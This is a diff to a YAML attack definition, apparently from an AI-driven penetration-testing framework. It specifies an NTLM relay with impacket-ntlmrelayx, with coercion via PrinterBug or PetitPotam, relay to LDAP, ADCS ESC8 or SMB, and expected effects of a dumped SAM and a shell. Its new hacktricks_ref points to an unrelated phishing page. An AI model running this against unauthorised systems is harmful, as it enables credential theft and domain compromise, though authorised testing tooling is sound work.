@@ -2,19 +2,22 @@ name: ntlmrelayx
 category: ad
 description: NTLM relay attack — relay captured auth to target service
 preconditions:
-  - has_target
-  - os==windows
+- has_target
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
   target_url: from_engagement.relay_target
-command_template: "impacket-ntlmrelayx -t {target_url} -smb2support"
+command_template: impacket-ntlmrelayx -t {target_url} -smb2support
 parser: ntlmrelayx_parser
 expected_effects:
-  - ntlm_relayed
-  - sam_dumped
-  - shell_obtained
+- ntlm_relayed
+- sam_dumped
+- shell_obtained
 falsifier:
-  pattern: "Error starting|Cannot bind"
+  pattern: signing is required|error|refused
   timeout: 600
 model_tier: haiku
-mechanism: "Intercepts NTLM auth on port 445 and relays to target. Requires: (1) coercion method that callbacks on 445 (PrinterBug/PetitPotam), (2) target without SMB signing required. Can relay to LDAP for ACL abuse, HTTP for ADCS ESC8, SMB for exec."
+mechanism: 'Intercepts NTLM auth on port 445 and relays to target. Requires: (1) coercion
+  method that callbacks on 445 (PrinterBug/PetitPotam), (2) target without SMB signing
+  required. Can relay to LDAP for ACL abuse, HTTP for ADCS ESC8, SMB for exec.'
+hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
